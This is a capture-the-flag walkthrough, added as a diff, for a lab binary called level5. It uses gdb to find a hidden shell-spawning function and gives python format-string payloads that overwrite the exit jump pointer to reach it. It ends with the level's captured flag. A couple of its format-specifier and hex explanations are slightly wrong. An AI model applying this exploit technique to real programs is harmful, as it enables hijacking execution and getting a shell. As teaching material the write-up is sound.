@@ -1,0 +1,42 @@
+- This level is similar to the 2 previous levels
+
+- We found that there are 3 functions:
+
+$> gdb ./level5
+(gdb) info func
+All defined functions:
+[...]
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+
+- The program execute just 2 functions (main & n), the main function calls the n() function.
+
+(gdb) disass main
+[...]
+0x0804850a <+6>:	call   0x80484c2 <n>
+
+
+- The o() function is not executed by the program, and after disassembling we see that it runs a shell with the system("/bin/sh") function. so we need to find a way to call the o() function.
+
+- After disassembling we see that there is no return that will allow us to redirect execution to the o() function, but there is a call to exit function and after disassembling it:
+
+(gdb) disass exit
+0x080483d0 <+0>:	jmp    *0x8049838
+[...]
+
+- We see this jmp and we will exploit it and replace the address 0x08049838 with 0x080484a4
+
+- We can do this with use the full hex number (0x080484a4) or only the last 4 chars cuz both of them start with 0x0804.
+
+0x080484a4 (hex) = 134513828
+33956 (hex) = 33956
+
+- We will use 'hn' for 33956 or 'h' for 134513828, Now we need to make the payload for exploiting.
+
+$> python -c "print '\x38\x98\x04\x08' + '%134513824d' + '%4\$n'" > /tmp/payload
+or
+$> python -c "print '\x38\x98\x04\x08' + '%33952d' + '%4\$hn'" > /tmp/payload
+$> cat /tmp/payload - | ./level5
+[...]
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
